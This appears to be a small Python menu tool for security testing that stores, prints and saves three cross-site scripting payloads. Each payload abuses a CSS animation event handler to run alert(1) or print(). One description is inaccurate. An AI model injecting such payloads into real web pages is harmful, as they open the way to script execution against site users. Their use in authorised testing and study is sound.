templates = [
    {
        "name": "onanimationcancel",
        "description": "Fires when a CSS animation cancels",
        "difficulty": "Easy",
        "category": "Event Handler",
        "template": """<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>"""
    },
    {
        "name": "onanimationend",
        "description": "Fires when a CSS animation ends",
        "difficulty": "Medium",
        "category": "Event Handler",
        "template": """<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>"""
    },
    {
        "name": "onanimationiteration",
        "description": "Fires when a CSS animation starts",
        "difficulty": "Hard",
        "category": "Event Handler",
        "template": """<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>"""
    }
]


def menu():
    print("\n========== XSS TEMPLATE MANAGER ==========")
    print("[1] Generate")
    print("[2] Save")
    print("[3] View")
    print("[4] Exit")
    print("==========================================")

    try:
        return int(input("Enter Your Choice: "))
    except ValueError:
        print("Invalid choice. Please enter a number.")
        return None


def generate():
    print("\nAvailable Templates\n")

    for i, template in enumerate(templates, start=1):
        print(f"[{i}] {template['name']}")
        print(f"    Category   : {template['category']}")
        print(f"    Difficulty : {template['difficulty']}")
        print(f"    Description: {template['description']}")
        print()

    try:
        temp = int(input("Which Template You Want: "))
    except ValueError:
        print("Please enter a valid number.")
        return None

    if 1 <= temp <= len(templates):
        selected = templates[temp - 1]

        print("\n========== TEMPLATE ==========")
        print(f"Name        : {selected['name']}")
        print(f"Category    : {selected['category']}")
        print(f"Difficulty  : {selected['difficulty']}")
        print(f"Description : {selected['description']}")
        print(f"Template    : {selected['template']}")
        print("==============================\n")

        return selected

    print("Invalid Template.")
    return None


def save(selected):
    print("\nSaving Template...\n")

    if selected is None:
        print("Please generate a template first.\n")
        return

    with open("Saved.txt", "a", encoding="utf-8") as f:
        f.write("========================================\n")
        f.write(f"Name        : {selected['name']}\n")
        f.write(f"Category    : {selected['category']}\n")
        f.write(f"Difficulty  : {selected['difficulty']}\n")
        f.write(f"Description : {selected['description']}\n")
        f.write(f"Template    : {selected['template']}\n")
        f.write("========================================\n\n")

    print("Template saved successfully!\n")


def view():
    print("\nSaved Templates\n")

    try:
        with open("Saved.txt", "r", encoding="utf-8") as f:
            empty = True

            for line in f:
                empty = False
                print(line.rstrip())

            if empty:
                print("No templates saved.")

    except FileNotFoundError:
        print("No templates saved.")


selected = None

while True:
    option = menu()

    if option is None:
        continue

    if option == 1:
        result = generate()

        if result is not None:
            selected = result

    elif option == 2:
        save(selected)

    elif option == 3:
        view()

    elif option == 4:
        print("Goodbye!")
        break

    else:
        print("Invalid Option.")